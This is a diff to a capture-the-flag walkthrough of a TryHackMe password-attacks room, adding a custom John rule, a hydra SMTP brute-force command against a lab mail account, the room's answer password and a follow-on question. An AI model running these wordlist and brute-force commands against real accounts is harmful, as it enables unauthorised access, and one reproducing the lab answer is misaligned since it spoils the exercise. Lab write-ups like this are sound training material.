@@ -24,12 +24,20 @@ cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/
 
 ```
 [List.Rules:THM-Password-Attacks]
-Az"[0-9][0-9]" ^[!@]
+Az"[0-9][0-9]" ^[!@#$]
 ```
 
 **Kali**
 
 ```
 john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst
-hydra -l pittman@clinic.thmredteam.com -P dict.lst smtp://10.10.131.68:25 -v
+hydra -l pittman@clinic.thmredteam.com -P dict.lst smtp://$VICTIM:25 -v
 ```
+
+Answer is !multidisciplinary00
+
+**Perform a brute-forcing attack against the phillips account for the login page at http://10.10.130.199/login-get using hydra? What is the flag?**
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
